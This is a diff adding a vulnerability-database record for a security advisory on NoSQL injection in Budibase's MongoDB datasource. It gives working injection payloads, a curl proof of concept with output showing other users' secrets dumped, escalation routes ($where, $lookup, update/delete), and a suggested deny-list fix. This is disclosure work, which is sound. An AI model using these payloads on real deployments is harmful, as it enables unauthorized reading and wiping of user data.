@@ -1,0 +1,187 @@
+[basic]
+description = '''
+## Summary
+
+An end-user injection in Budibase's MongoDB datasource lets any BASIC app user bypass the builder's query-level access controls. Builders scope MongoDB reads per-user with bindings like `{\"email\": \"{{ currentUser.email }}\"}` so each app user only sees their own rows. Because the binding is handlebars-enriched into the query JSON with `noEscaping: true` and then `JSON.parse`d, Bob (a BASIC user) overrides the builder's filter with a MongoDB operator and reads every document the connection can touch. SQL datasources are parameterized through `interpolateSQL()`; the MongoDB path has no equivalent, so the scoping pattern Budibase's own docs show is unsafe.
+
+## Details
+
+### Enrichment
+
+`packages/server/src/sdk/workspace/queries/queries.ts:105-125` enriches every string field of the query with handlebars, then parses the enriched `json` field:
+
+```typescript
+enrichedQuery[key] = processStringSync(fields[key], parameters, {
+  noEscaping: true,
+  noHelpers: true,
+  escapeNewlines: true,
+})
+// ...
+enrichedQuery.json = JSON.parse(
+  enrichedQuery.json || enrichedQuery.customData || enrichedQuery.requestBody
+)
+```
+
+`noEscaping: true` turns `{{name}}` into `{{{name}}}`, which Handlebars renders without HTML-escaping. Any `\"` or `}` the attacker supplies lands verbatim in the enriched string. `JSON.parse` then produces a structured object whose top-level keys and operators came from the parameter value.
+
+### Execution
+
+`packages/server/src/integrations/mongodb.ts:499-512`:
+
+```typescript
+async read(query: MongoDBQuery) {
+  try {
+    await this.connect()
+    const db = this.client.db(this.config.db)
+    const collection = db.collection(query.extra.collection)
+    let json = this.createObjectIds(query.json)
+    switch (query.extra.actionType) {
+      case \"find\": {
+        if (json) {
+          return await collection.find(json).toArray()
+        }
+```
+
+`createObjectIds` walks the object and rewrites strings that look like `ObjectId(...)`. It does not strip `$`-prefixed keys and does not reject operator-shaped values. The injected filter reaches `collection.find` unchanged.
+
+For comparison, SQL datasources go through `interpolateSQL` at `packages/server/src/threads/query.ts:145`, which parameterizes bindings into driver-level bind variables. The MongoDB path has no equivalent.
+
+### Duplicate-key trick
+
+The template gives the attacker one substitution point inside the `name` value. The outer `{\"name\": \"` / `\"}` is fixed. The attacker's payload:
+
+```
+x\", \"name\": {\"$ne\": \"x\"}, \"$comment\": \"bud-033
+```
+
+Renders to:
+
+```json
+{\"name\": \"x\", \"name\": {\"$ne\": \"x\"}, \"$comment\": \"bud-033\"}
+```
+
+`JSON.parse` keeps the last value for a duplicate key (ECMA-404 leaves this implementation-defined; V8 and Node's `JSON.parse` keep the last), so the parsed object is:
+
+```js
+{ name: { $ne: \"x\" }, $comment: \"bud-033\" }
+```
+
+`$comment` is a MongoDB meta operator that the server accepts and ignores, so it consumes the template's trailing `\"}` without restricting the query. The filter that reaches MongoDB is `name != \"x\"`, which matches every document.
+
+## Proof of Concept
+
+Tested against Budibase 3.35.8 (master at f960e361) and MongoDB 6.
+
+Step 1: Admin creates a MongoDB datasource and seeds three documents:
+
+```bash
+docker run -d --name mongo -p 27017:27017 mongo:6
+docker exec mongo mongosh --quiet --eval '
+  db = db.getSiblingDB(\"testdb\");
+  db.users.insertMany([
+    {name:\"alice\", email:\"alice@x.com\", secret:\"public-alice\"},
+    {name:\"bob\",   email:\"bob@x.com\",   secret:\"PRIVATE-BOB\"},
+    {name:\"eve\",   email:\"eve@x.com\",   secret:\"PRIVATE-EVE\"}
+  ]);'
+```
+
+Step 2: Alice, a builder, configures the datasource and writes a MongoDB query `find-by-name` whose `json` field is `{\"name\": \"{{name}}\"}`. She publishes the app and grants Bob (BASIC) a role on it.
+
+Step 3: Bob, logged in as BASIC with a role on the published app, executes the query via the standard execute endpoint. `POST /api/queries/:queryId` is reachable by any app role with permission on the query (it is how Budibase renders query-backed tables to end users):
+
+```bash
+curl -sS -b \"$BOB_COOKIE\" -X POST \"$BASE/api/queries/$QUERY_ID\" \
+  -H \"Content-Type: application/json\" -H \"x-budibase-app-id: $PROD_APP\" \
+  -d '{\"parameters\":{\"name\":\"x\\", \\"name\\": {\\"$ne\\": \\"x\\"}, \\"$comment\\": \\"bud-033\"}}'
+```
+
+Legitimate `name=alice` returned only Alice:
+
+```json
+[{\"_id\":\"...\",\"name\":\"alice\",\"email\":\"alice@x.com\",\"secret\":\"public-alice\"}]
+```
+
+The injection payload returned all three documents:
+
+```json
+[
+  {\"_id\":\"...\",\"name\":\"alice\",\"email\":\"alice@x.com\",\"secret\":\"public-alice\"},
+  {\"_id\":\"...\",\"name\":\"bob\",  \"email\":\"bob@x.com\",  \"secret\":\"PRIVATE-BOB\"},
+  {\"_id\":\"...\",\"name\":\"eve\",  \"email\":\"eve@x.com\",  \"secret\":\"PRIVATE-EVE\"}
+]
+```
+
+MongoDB's profiling confirmed the filter that reached the server:
+
+```json
+{\"find\":\"users\",\"filter\":{\"name\":{\"$ne\":\"never-matches\"},\"$comment\":\"bud-033\"}}
+```
+
+## Impact
+
+The builder's per-user filter collapses. A BASIC end-user who is only meant to read their own documents reads everyone's.
+
+Concrete scenario: builder publishes an app whose \"My records\" screen runs a MongoDB query with `json` = `{\"email\": \"{{ currentUser.email }}\"}`. Each app user is supposed to see only the rows where `email` matches their session. Bob, a BASIC user in that app, sends `bob@x.com\", \"email\": {\"$ne\": \"x\"}, \"$comment\": \"x` as the `currentUser.email` binding replacement and receives every row in the collection, including other tenants' users, admin records, and any secret fields the builder stored alongside.
+
+The blast radius depends on what the builder exposed:
+
+- **Read queries**: full-collection dump (demonstrated above: three docs returned where the scoped filter returned one, including other users' secrets).
+- **`$where` operator**: arbitrary JavaScript inside the MongoDB server process. The attacker exfiltrates any field of any document through the JS expression or via timing side channels.
+- **`$function` / `$accumulator`** (MongoDB 4.4+): arbitrary JS in aggregation stages.
+- **`$lookup`**: cross-collection joins within the same database. If the MongoDB datasource holds admin tokens or sensitive collections next to the one the builder queried, the injection reaches them.
+- **`update` / `delete` action types**: the filter injection rewrites the affected-document set. One request wipes or rewrites every document the connection can reach.
+
+The blast radius is the builder's own MongoDB deployment, not Budibase infrastructure. Budibase does not ship or run MongoDB; this connector talks to the customer's external Mongo, so the attacker reads and writes data the builder's connection has access to and does not cross into Budibase's tenant boundary, CouchDB, MinIO, or Redis. The vulnerable pattern (`{{binding}}` inside the JSON body) is the exact shape Budibase's documentation shows for parameterized MongoDB queries, and there is no in-product warning that MongoDB behaves differently from SQL. CVSS reflects the common read-query scope (filter bypass on a single collection); the `$where` / `$lookup` / write-action paths exist but depend on what primitives the builder exposed.
+
+## Recommended Fix
+
+Strip `$`-prefixed keys from any object that originates from user-controlled parameters before it reaches `collection.find`/`updateOne`/`deleteOne`. A single guard in `createObjectIds` covers the read, update, and delete paths:
+
+```typescript
+// packages/server/src/integrations/mongodb.ts:394 (createObjectIds)
+const DANGEROUS = new Set([
+  \"$where\", \"$function\", \"$accumulator\",
+  \"$expr\", \"$regex\", \"$ne\", \"$nin\", \"$gt\", \"$gte\", \"$lt\", \"$lte\",
+  \"$or\", \"$and\", \"$nor\", \"$not\", \"$exists\", \"$type\", \"$mod\",
+  \"$text\", \"$comment\",
+])
+
+function stripOperators(obj: any): any {
+  if (obj === null || typeof obj !== \"object\") return obj
+  if (Array.isArray(obj)) return obj.map(stripOperators)
+  const cleaned: Record<string, any> = {}
+  for (const [k, v] of Object.entries(obj)) {
+    if (DANGEROUS.has(k)) continue
+    cleaned[k] = stripOperators(v)
+  }
+  return cleaned
+}
+```
+
+A safer fix mirrors the SQL path: introduce a MongoDB-aware enrichment that binds parameters as values instead of string-substituting them into the query JSON. That eliminates the whole class.
+
+---
+*Found by [aisafe.io](https://aisafe.io)*
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Budibase: NoSQL injection in MongoDB integration: collection dump, $where JS exec, cross-collection pivot, arbitrary update/delete"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-pmpg-2mxq-6xwr"]
+ave_id = "AVE-2026-1169"
+
+[meta]
+collected_at = "2026-08-06T09:14:10.340139969+00:00"
+status = "completed"
+
+[references]
+urls = []
